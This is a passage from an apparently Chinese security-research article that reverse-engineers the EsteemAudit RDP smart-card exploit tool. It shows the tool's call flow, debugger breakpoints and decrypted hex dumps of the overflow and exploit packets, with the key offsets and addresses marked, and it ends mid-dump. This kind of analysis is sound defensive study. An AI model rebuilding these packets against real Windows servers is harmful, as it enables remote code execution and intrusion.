038e3ccb&nbsp;&nbsp;0031002e&nbsp;00380036&nbsp;0032002e&nbsp;00320034&nbsp;&nbsp;..1.6.8…2.4.2.
038e3cdb&nbsp;&nbsp;0031002e&nbsp;003c0000&nbsp;003a0043&nbsp;0057005c&nbsp;&nbsp;..1…&lt;.C.:.\.W.
038e3ceb&nbsp;&nbsp;004e0049&nbsp;0054004e&nbsp;0053005c&nbsp;00730079&nbsp;&nbsp;I.N.N.T.\.S.y.s.
038e3cfb&nbsp;&nbsp;00650074&nbsp;0033006d&nbsp;005c0032&nbsp;0073006d&nbsp;&nbsp;t.e.m.3.2.\.m.s.</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">我们可以通过文档[MS-RDPBCGR]查阅协议的细节来查看TS_INFO_PACKET。</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t01d255b757847e2e87.png" title="t01b7262754aba26ac6.png" alt="http://p5.qhimg.com/t01b7262754aba26ac6.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">智能卡扩展</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">RDP协议支持客户端使用智能卡模式登录，根据文档[MS-RDPESC]交互的流程如下</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t01bda278642ed66946.png" title="t01631e91602236f9fb.png" alt="http://p1.qhimg.com/t01631e91602236f9fb.png"/></p><p style="text-align:center"><img src="http://p9.qhimg.com/t01a07968637701fff1.png" title="t01918f46505bb98a64.png" alt="http://p2.qhimg.com/t01918f46505bb98a64.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">EsteemAudit使用SCARD_IOCTL_TRANSMIT与服务器端的智能卡模块进行交互。</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t018c568029cbb60d6e.png" title="t0106b3a8bcff1d96f4.png" alt="http://p5.qhimg.com/t0106b3a8bcff1d96f4.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">文档描述了服务器端响应客户端的数据包的各种类型，其中包含了Transmit_Return类型</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t019ec49a67d5469f49.png" title="t0149e49b61afc4f918.png" alt="http://p1.qhimg.com/t0149e49b61afc4f918.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">服务器端</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t014aaf233b0a330dd9.png" title="t0183a9b27eaceb6d8a.png" alt="http://p4.qhimg.com/t0183a9b27eaceb6d8a.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">RDP 利用工具 (EsteemAudit.exe)</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">了解RDP的基础知识后，我们看看EsteemAudit具体看了什么。EsteemAudit.exe类似于RDP客户端，完成了和服务器端的RDP协议交互。EsteemAudit使用了RDP协议中的智能卡扩展，向服务器端发送智能卡认证请求。随后RDP服务端会使用智能卡模块gpkcsp.dll处理收到的数据，漏洞在此出现。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">EsteemAudit.exe 总览</span></strong></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">通过逆向EsteemAudit二进制文件，在地址.text:00381009我们找到了名为GoRunExp的函数</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">GoRunExp
à&nbsp;InitializeInputParameters&nbsp;//&nbsp;获取配置信息
à&nbsp;connect2Target
ààinitRDPLib
ààemulateSmartCard
ààconnect2RDP
ààregisterCallback(CallBackFunction)
à&nbsp;RecvProcessSendPackets
à&nbsp;RdpLib_SendKeyStrokes&nbsp;//&nbsp;发送空格
à&nbsp;RecvProcessSendPackets
à&nbsp;buildExpBuffer
ààbuild_all_x86
àààbuild_overflow_x86
àààbuild_exploit_x86
àààbuild_egg0_x86
ààà//&nbsp;设置认证码,&nbsp;异或掩码,&nbsp;打开载荷,&nbsp;etc
ààà&nbsp;build_egg1_payloadxxx
à&nbsp;RdpLib_SendKeyStrokes&nbsp;//&nbsp;发送回车
à&nbsp;RecvProcessSendPackets
…
à&nbsp;RecvProcessSendPackets
àà//发送智能卡认证重定向请求，接收和处理响应，与服务器端进行交互，随后发送ExpBuffer(包含overflow&nbsp;buffer,&nbsp;exploit&nbsp;和&nbsp;egg0&nbsp;buffer)在服务器端控制EIP，最后发送结束响应给服务器端完成第一阶段利用。
àà//to&nbsp;be&nbsp;mentioned,&nbsp;注册的回调函数connect2Target会被用来处理响应和打印一些类似与&nbsp;“SELECT_FILE&nbsp;–&nbsp;GPK&nbsp;Card&nbsp;MF”,&nbsp;“GET_RESPONSE&nbsp;–&nbsp;data&nbsp;unit&nbsp;size”,&nbsp;“GET_RESPONSE&nbsp;–&nbsp;serial&nbsp;number”的日志.</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们发现在准备阶段，完成了与目标机器的连接和构建漏洞利用数据包。RecvProcessSendPackets被多次调用用于接收和处理服务器端的响应、并根据响应来发送数据。RecvProcessSendPackets完成了与RDP服务器端利用智能卡交互的所有细节，我们会在接下来的章节中详细阐述。当然，我们会注重函数如何构造数据包而不会阐述函数的细节。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">缓冲区溢出数据包分析</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在构造用于溢出的数据包的时，仅有两个字段是有实际意义的：偏移为0x8d中的值、偏移为0x91值（0x9000），其他字段都是填充的随机数据。</span></p><p style="text-align:center"><img src="http://p0.qhimg.com/t010510671f84e74b72.png" title="t0126d3c7f05d825299.png" alt="http://p1.qhimg.com/t0126d3c7f05d825299.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">为了观察客户端发送的完整的数据，我们查看了发送的用于溢出的数据包。</span></p><p style="text-align:center"><img src="http://p9.qhimg.com/t01bf98095c574a9898.png" title="t01fa33b28a41ecfba1.png" alt="http://p1.qhimg.com/t01fa33b28a41ecfba1.png"/></p><p style="text-align:center"><img src="http://p5.qhimg.com/t0132a627fcbaaa6bc2.png" title="t01c767b2161dbadd87.png" alt="http://p2.qhimg.com/t01c767b2161dbadd87.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如前面章节所述，在偏移为0x51，名为TS_INFO_PACKET被加密过了。我们观察到了客户端中用来加密TS_INFO_PACKET数据的函数为Libeay32!RC4 function。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们可以通过简单的调试获取到了RC4解密的函数原型RC4 function — RC4(key, len, in, out)</span></p><p style="text-align:center"><img src="http://p0.qhimg.com/t01730230ab23884784.png" title="t015a6800c9824446b7.png" alt="http://p0.qhimg.com/t015a6800c9824446b7.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">通过在解密函数前后下断点，可以得到加密前的数据和加密后的数据。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">bu&nbsp;image00380000+0xab24&nbsp;“.echo&nbsp;len;dc&nbsp;esp+10&nbsp;L1;.echo&nbsp;rc4_in_buffer;dc&nbsp;poi(esp+8);gc”
bu&nbsp;image00380000+0xab39&nbsp;“.echo&nbsp;rc4_out_buffer;dc&nbsp;poi(esp+0c);gc”</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">下面我们给出TS_INFO_PACKET的内容</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">len
0178cf98&nbsp;&nbsp;000000fc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;….
encrypted
038e8d6b&nbsp;&nbsp;0649efba&nbsp;dcb9b66b&nbsp;f63f676c&nbsp;a2ddcc3b&nbsp;&nbsp;..I.k…lg?.;…
038e8d7b&nbsp;&nbsp;56e1fb2e&nbsp;c9ed4e9c&nbsp;bf566979&nbsp;4d9e3868&nbsp;&nbsp;…V.N..yiV.h8.M
038e8d8b&nbsp;&nbsp;5dffb177&nbsp;af4531e2&nbsp;cd87df84&nbsp;18a3afff&nbsp;&nbsp;w..].1E………
038e8d9b&nbsp;&nbsp;56c96e10&nbsp;7dd116d9&nbsp;f1db47e2&nbsp;b65bba04&nbsp;&nbsp;.n.V…}.G….[.
038e8dab&nbsp;&nbsp;5d8892ca&nbsp;324864cb&nbsp;70bc4793&nbsp;82be0c5b&nbsp;&nbsp;…].dH2.G.p[…
038e8dbb&nbsp;&nbsp;d5737937&nbsp;512ce129&nbsp;21738638&nbsp;ca18a61a&nbsp;&nbsp;7ys.).,Q8.s!….
038e8dcb&nbsp;&nbsp;58a5f061&nbsp;fe8af8db&nbsp;f6c40f83&nbsp;a975c925&nbsp;&nbsp;a..X……..%.u.
038e8ddb&nbsp;&nbsp;7da42561&nbsp;8e0a740f&nbsp;b10381b2&nbsp;ef4f3c00&nbsp;&nbsp;a%.}.t…….&lt;O.
…
decrypted
038e8d6b&nbsp;&nbsp;000000f4&nbsp;00000003&nbsp;49434472&nbsp;00000000&nbsp;&nbsp;……..rDCI….
038e8d7b&nbsp;&nbsp;00000001&nbsp;00000000&nbsp;000000e0&nbsp;00081001&nbsp;&nbsp;…………….
038e8d8b&nbsp;&nbsp;cccccccc&nbsp;000000c0&nbsp;00000000&nbsp;00000000&nbsp;&nbsp;…………….
038e8d9b&nbsp;&nbsp;00000000&nbsp;000000b2&nbsp;00000001&nbsp;000000b2&nbsp;&nbsp;…………….
038e8dab&nbsp;&nbsp;fce3940b&nbsp;f2c3bad3&nbsp;7134f185&nbsp;b595ac48&nbsp;&nbsp;……….4qH…
038e8dbb&nbsp;&nbsp;2d8186ec&nbsp;56e66ee1&nbsp;ca0e854f&nbsp;e618d890&nbsp;&nbsp;…-.n.VO…….
038e8dcb&nbsp;&nbsp;fcf78fcf&nbsp;6972d722&nbsp;8a3307d7&nbsp;e1715046&nbsp;&nbsp;….”.ri..3.FPq.
038e8ddb&nbsp;&nbsp;6d3184f2&nbsp;7eb82735&nbsp;0c1d6f4b&nbsp;e6a262fe&nbsp;&nbsp;..1m5′.~Ko…b..
Protocol&nbsp;details&nbsp;[references:&nbsp;[MS-RDPESC].pdf,&nbsp;[MS-RDPEFS].pdf,&nbsp;[MS-RPCE].pdf]
000000f4&nbsp;-&gt;CodePage
00000003&nbsp;-&gt;Flags
Device&nbsp;Control&nbsp;Response&nbsp;(DR_CONTROL_RSP)
-&gt;DeviceIoReply&nbsp;(16&nbsp;bytes):&nbsp;DR_DEVICE_IOCOMPLETION
4472&nbsp;-&gt;RDPDR_CTYP_CORE&nbsp;0x4472
4943&nbsp;-&gt;PAKID_CORE_DEVICE_IOCOMPLETION&nbsp;0x4943
00000000&nbsp;-&gt;DeviceId&nbsp;(4&nbsp;bytes)
00000001&nbsp;-&gt;CompletionId&nbsp;(4&nbsp;bytes)
00000000&nbsp;-&gt;IoStatus&nbsp;(4&nbsp;bytes)
000000e0&nbsp;-&gt;OutputBufferLength&nbsp;(4&nbsp;bytes)
-&gt;OutputBuffer&nbsp;(variable)
00081001&nbsp;cccccccc&nbsp;Type&nbsp;Serialization&nbsp;Version&nbsp;1&nbsp;header
000000c0&nbsp;-&gt;ObjectBufferLength&nbsp;(4&nbsp;bytes)
00000000&nbsp;-&gt;Filler&nbsp;(4&nbsp;bytes)
00000000&nbsp;-&gt;ReturnCode
00000000&nbsp;-&gt;dwProtocol
000000b2&nbsp;-&gt;cbRecvLength
-&gt;pbExtraBytes
00000001&nbsp;000000b2
fce3940b&nbsp;f2c3bad3&nbsp;7134f185&nbsp;b595ac48
2d8186ec&nbsp;56e66ee1&nbsp;ca0e854f&nbsp;e618d890
fcf78fcf&nbsp;6972d722&nbsp;8a3307d7&nbsp;e1715046
6d3184f2&nbsp;7eb82735&nbsp;0c1d6f4b&nbsp;e6a262fe</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">继续执行程序，随后我们从内存中dump出了触发缓冲区溢出的两个关键字段</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">WINDBG&gt;dc&nbsp;04fdd650+8d
04fdd6dd&nbsp;&nbsp;080190dc&nbsp;00009000&nbsp;d7d93015&nbsp;9dd1e4b1&nbsp;&nbsp;.........0......</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">地址0x080190dc我们在前面的章节介绍过，不再阐述。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">漏洞利用数据包分析</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在构造数据包的过程中，我们发现了一些有趣的字段，如0x11111111, 0x22222222和0x7ffe0300</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t01a166fbaf0c3f4a53.png" title="t01d91be5af0fd82d0e.png" alt="http://p7.qhimg.com/t01d91be5af0fd82d0e.png"/></p><p style="text-align:center"><img src="http://p0.qhimg.com/t014aa18d9c15db27a1.png" title="t01a5ecaf98d98eb667.png" alt="http://p0.qhimg.com/t01a5ecaf98d98eb667.png"/></p><p style="text-align:center"><img src="http://p5.qhimg.com/t019887688118bab454.png" title="t01738f2cc0559bba18.png" alt="http://p0.qhimg.com/t01738f2cc0559bba18.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们使用解密缓冲区溢出数据包的方法解密漏洞利用数据包，得到</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">encrypted
038e9d83&nbsp;&nbsp;0d76b81e&nbsp;51331ed0&nbsp;b3b4b29d&nbsp;ba4a1aaa&nbsp;&nbsp;..v…3Q……J.
038e9d93&nbsp;&nbsp;ad0b26e1&nbsp;c15daa1e&nbsp;20079871&nbsp;a18afe91&nbsp;&nbsp;.&amp;….].q..&nbsp;….
038e9da3&nbsp;&nbsp;46d26828&nbsp;a8883de7&nbsp;8b54718e&nbsp;33ebf243&nbsp;&nbsp;(h.F.=…qT.C..3
038e9db3&nbsp;&nbsp;9d3d556b&nbsp;f8a4f6f8&nbsp;4a29500c&nbsp;5d06bd19&nbsp;&nbsp;kU=……P)J…]
038e9dc3&nbsp;&nbsp;e6099604&nbsp;4bc7dc66&nbsp;92103b5e&nbsp;6da27faa&nbsp;&nbsp;….f..K^;…..m
038e9dd3&nbsp;&nbsp;07420e27&nbsp;c95b5664&nbsp;79d50284&nbsp;f7bbd1d3&nbsp;&nbsp;‘.B.dV[….y….
038e9de3&nbsp;&nbsp;79c389e1&nbsp;f795e1cf&nbsp;bcb35b4d&nbsp;69d0ef0c&nbsp;&nbsp;…y….M[…..i
038e9df3&nbsp;&nbsp;92beeadf&nbsp;9010b061&nbsp;763848d5&nbsp;bc032358&nbsp;&nbsp;….a….H8vX#..
…
Decrypted
038e9d83&nbsp;&nbsp;00000204&nbsp;00000003&nbsp;49434472&nbsp;00000000&nbsp;&nbsp;……..rDCI….
038e9d93&nbsp;&nbsp;00000001&nbsp;00000000&nbsp;000001f0&nbsp;00081001&nbsp;&nbsp;…………….
038e9da3&nbsp;&nbsp;cccccccc&nbsp;000001d0&nbsp;00000000&nbsp;00000000&nbsp;&nbsp;…………….
038e9db3&nbsp;&nbsp;00000000&nbsp;000001c0&nbsp;00000001&nbsp;000001c0&nbsp;&nbsp;…………….
038e9dc3&nbsp;&nbsp;ada0d86e&nbsp;08011e7a&nbsp;0801118e&nbsp;08005e85&nbsp;&nbsp;n…z……..^..
038e9dd3&nbsp;&nbsp;0800bedd&nbsp;11111111&nbsp;2a6bd248&nbsp;972dc73e&nbsp;&nbsp;……..H.k*&gt;.-.
038e9de3&nbsp;&nbsp;00000000&nbsp;6431e6f0&nbsp;08011fef&nbsp;08019078&nbsp;&nbsp;……1d….x…
038e9df3&nbsp;&nbsp;abc45491&nbsp;22222222&nbsp;00000000&nbsp;316f482f&nbsp;&nbsp;.T..””””…./Ho1
…</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">漏洞利用数据包，也是一个Device Control Response(DR_CONTROL_RSP)，应为设置了标志为DR_DEVICE_IOCOMPLETION (0x49434472)。这和之前描述的缓冲区溢出的数据包一致。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">第一阶段最后两个数据包是Select_MF和End Response。这里我们只展示被解密后的数据。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">len
0178cf98&nbsp;&nbsp;0000004c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;L…
plain
038ead9b&nbsp;&nbsp;00000044&nbsp;00000003&nbsp;49434472&nbsp;00000000&nbsp;&nbsp;D…….rDCI….
038eadab&nbsp;&nbsp;00000001&nbsp;00000000&nbsp;00000030&nbsp;00081001&nbsp;&nbsp;……..0…….
038eadbb&nbsp;&nbsp;cccccccc&nbsp;00000010&nbsp;00000000&nbsp;00000000&nbsp;&nbsp;…………….
038eadcb&nbsp;&nbsp;00000000&nbsp;00000002&nbsp;00000001&nbsp;00000002&nbsp;&nbsp;…………….
038eaddb&nbsp;&nbsp;00000090&nbsp;00000000&nbsp;00000000</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这里pExtraBytes长度为2，接下来的两个额外字节分别是90 00在服务器上会被智能卡模块处理。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">len
0178cf98&nbsp;&nbsp;0000003c</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">pExtraBytes长度为0，是一个结束的响应包。这个数据包完成了EsteemAudit与客户端的交互，接着我们看看服务器端如何处理这些数据。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">RDP 服务器端</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在看完EsteemAudit和RDP服务器端交互的数据包各个字段的具体含义后，接下来我们关注服务器端如何处理这些数据、漏洞是如何被触发的和如何完成漏洞利用。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">内核态</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">下面列出的两个调用栈信息直接展示了DEVICE_IO的处理流程。termdd是一个核心分发器(dispatcher)，RDPWD负责MSC协议栈，我们可以通过函数RDPWD!MCSIcaRawInput获取从客户端发送的原始数据。接下来的一些函数会将前面提到的RDP协议一层一层的解析。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">kd&gt;&nbsp;k
#&nbsp;ChildEBP&nbsp;RetAddr
00&nbsp;baf3b32c&nbsp;f6e134ef&nbsp;rdpdr!DrExchangeManager::RecognizePacket+0x8
01&nbsp;baf3b350&nbsp;f6e12e34&nbsp;rdpdr!DrSession::ReadCompletion+0x95
02&nbsp;baf3b368&nbsp;8081d741&nbsp;rdpdr!DrSession::ReadCompletionRoutine+0x38
03&nbsp;baf3b398&nbsp;f76895d8&nbsp;nt!IopfCompleteRequest+0xcd
04&nbsp;baf3b3d4&nbsp;f768a0d2&nbsp;termdd!IcaChannelInputInternal+0x1f0
05&nbsp;baf3b3fc&nbsp;ba1a26e1&nbsp;termdd!IcaChannelInput+0x3c
06&nbsp;baf3b430&nbsp;ba19c3c1&nbsp;RDPWD!WDW_OnDataReceived+0x181
07&nbsp;baf3b458&nbsp;ba19c1b9&nbsp;RDPWD!SM_MCSSendDataCallback+0x159
08&nbsp;baf3b4c0&nbsp;ba19bfe0&nbsp;RDPWD!HandleAllSendDataPDUs+0x155
09&nbsp;baf3b4dc&nbsp;ba1b9ba4&nbsp;RDPWD!RecognizeMCSFrame+0x32
0a&nbsp;baf3b504&nbsp;ba19b06b&nbsp;RDPWD!MCSIcaRawInputWorker+0x346
0b&nbsp;baf3b52c&nbsp;f768d194&nbsp;RDPWD!MCSIcaRawInput+0x65
0c&nbsp;baf3b550&nbsp;baa92fcb&nbsp;termdd!IcaRawInput+0x58
0d&nbsp;baf3bd90&nbsp;f768c265&nbsp;TDTCP!TdInputThread+0x371
0e&nbsp;baf3bdac&nbsp;809418f4&nbsp;termdd!_IcaDriverThread+0x4d
0f&nbsp;baf3bddc&nbsp;80887f4a&nbsp;nt!PspSystemThreadStartup+0x2e
10&nbsp;00000000&nbsp;00000000&nbsp;nt!KiThreadStartup+0x16
kd&gt;&nbsp;k
#&nbsp;ChildEBP&nbsp;RetAddr
00&nbsp;f5a8b254&nbsp;f6e14f22&nbsp;rdpdr!RxLowIoCompletion+0x3a
01&nbsp;f5a8b260&nbsp;f6e15291&nbsp;rdpdr!DrDevice::CompleteRxContext+0x2a
02&nbsp;f5a8b284&nbsp;f6e158b0&nbsp;rdpdr!DrDevice::CompleteBusyExchange+0x4d
03&nbsp;f5a8b2cc&nbsp;f6e164b2&nbsp;rdpdr!DrDevice::OnDeviceControlCompletion+0x116
04&nbsp;f5a8b2f0&nbsp;f6e1269d&nbsp;rdpdr!DrDevice::OnDeviceIoCompletion+0x1ee
05&nbsp;f5a8b310&nbsp;f6e1285a&nbsp;rdpdr!DrExchangeManager::OnDeviceIoCompletion+0x55
06&nbsp;f5a8b324&nbsp;f6e1351f&nbsp;rdpdr!DrExchangeManager::HandlePacket+0x26
07&nbsp;f5a8b350&nbsp;f6e12e34&nbsp;rdpdr!DrSession::ReadCompletion+0xc5
08&nbsp;f5a8b368&nbsp;8081d741&nbsp;rdpdr!DrSession::ReadCompletionRoutine+0x38
09&nbsp;f5a8b398&nbsp;f76c95d8&nbsp;nt!IopfCompleteRequest+0xcd
0a&nbsp;f5a8b3d4&nbsp;f76ca0d2&nbsp;termdd!IcaChannelInputInternal+0x1f0
0b&nbsp;f5a8b3fc&nbsp;f53856e1&nbsp;termdd!IcaChannelInput+0x3c
0c&nbsp;f5a8b430&nbsp;f537f3c1&nbsp;RDPWD!WDW_OnDataReceived+0x181
0d&nbsp;f5a8b458&nbsp;f537f1b9&nbsp;RDPWD!SM_MCSSendDataCallback+0x159
0e&nbsp;f5a8b4c0&nbsp;f537efe0&nbsp;RDPWD!HandleAllSendDataPDUs+0x155
0f&nbsp;f5a8b4dc&nbsp;f539cba4&nbsp;RDPWD!RecognizeMCSFrame+0x32
10&nbsp;f5a8b504&nbsp;f537e06b&nbsp;RDPWD!MCSIcaRawInputWorker+0x346
11&nbsp;f5a8b52c&nbsp;f76cd194&nbsp;RDPWD!MCSIcaRawInput+0x65
12&nbsp;f5a8b550&nbsp;f55b2fcb&nbsp;termdd!IcaRawInput+0x58
13&nbsp;f5a8bd90&nbsp;f76cc265&nbsp;TDTCP!TdInputThread+0x371
14&nbsp;f5a8bdac&nbsp;809418f4&nbsp;termdd!_IcaDriverThread+0x4d
15&nbsp;f5a8bddc&nbsp;80887f4a&nbsp;nt!PspSystemThreadStartup+0x2e
16&nbsp;00000000&nbsp;00000000&nbsp;nt!KiThreadStartup+0x16</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们可以从IDA pro中的注释看到RDPWD!MCSIcaRawInputWorker调用RDPWD!RecognizeMCSFrame时srcBuf的内容。</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t017ffccaf19f6d3528.png" title="t016c61e1879becec32.png" alt="http://p0.qhimg.com/t016c61e1879becec32.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们还可以看到RDPWD!RecognizeMCSFrame如何解析PER</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t01425f3bb9ced0ebe5.png" title="t01df21a94af9c16f23.png" alt="http://p4.qhimg.com/t01df21a94af9c16f23.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">当MCS协议栈解析完成后，RDPWD会解析TS_DATA_INFO。TS_DATA_INFO中被加密的数据会被SM_MCSSendDataCallback调用SMDecryptPacket-&gt;DecryptData-&gt;rc4进行解密。</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t017a3e10d60c643544.png" title="t010ee8ebff31663d7a.png" alt="http://p1.qhimg.com/t010ee8ebff31663d7a.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们在可以在RDPWD!rc4下断点来看服务端解密前和解密后的数据，类似之前的libeay32。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">接着SM_MCSSendDataCallback函数会调用WDW_OnDataReceived来处理被解密的数据。</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t010ef6bd99bfcc6329.png" title="t01743483c7c3ef682e.png" alt="http://p9.qhimg.com/t01743483c7c3ef682e.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">随后，函数会调用termdd!IcaChannelInput来向不同的channel派发被解密的数据。这个例子中，EsteemAudit发送的缓冲区溢出数据包是DEVICE_IO类型的，且属于File System Virtual Channel Extension。将会被RDPDR模块解析。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们在缓冲区溢出数据包中可以找到DR_DEVICE_IOCOMPLETION [MS-RDPEFS.pdf]头部</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">000000f4&nbsp;-&gt;CodePage
00000003&nbsp;-&gt;Flags
Device&nbsp;Control&nbsp;Response&nbsp;(DR_CONTROL_RSP)
-&gt;DeviceIoReply&nbsp;(16&nbsp;bytes):&nbsp;DR_DEVICE_IOCOMPLETION
4472&nbsp;-&gt;RDPDR_CTYP_CORE&nbsp;0x4472
